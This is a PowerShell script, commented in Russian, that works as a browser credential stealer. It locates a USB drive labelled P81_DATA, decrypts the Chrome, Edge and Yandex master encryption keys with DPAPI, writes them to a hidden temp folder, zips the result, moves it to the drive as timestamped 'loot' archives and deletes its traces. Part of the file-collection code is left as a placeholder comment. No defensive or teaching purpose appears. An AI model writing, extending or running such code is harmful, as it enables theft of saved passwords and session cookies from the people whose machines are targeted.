# 1. Ищем твою флешку по имени
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "P81_DATA" } | Select-Object -ExpandProperty DriveLetter

if ($usb) {
    $destPath = "$($usb):\Loot"
    if (!(Test-Path $destPath)) { New-Item -ItemType Directory -Path $destPath }
    
    $tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
    New-Item -ItemType Directory -Path $tmp -Force > $null

    # --- Твой стандартный блок сбора данных (Chrome, Edge, Yandex) ---
    Add-Type -AssemblyName System.Security
    function Get-Key($p, $l) {
        if (Test-Path $p) {
            try {
                $j = Get-Content $p -Raw | ConvertFrom-Json
                $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
                $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
                "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\keys.txt" -Append
                return $true
            } catch { return $false }
        }
        return $false
    }

    # (Код сбора файлов оставляем прежний...)
    # ... 

    # 2. Упаковка и копирование
    if ((Get-ChildItem $tmp).Count -gt 0) {
        $z = "$env:TEMP\data.zip"
        Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
        
        # Копируем на флешку с уникальным именем (дата-время), чтобы не затереть старое
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        Move-Item $z "$destPath\loot_$timestamp.zip" -Force
    }

    Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
}
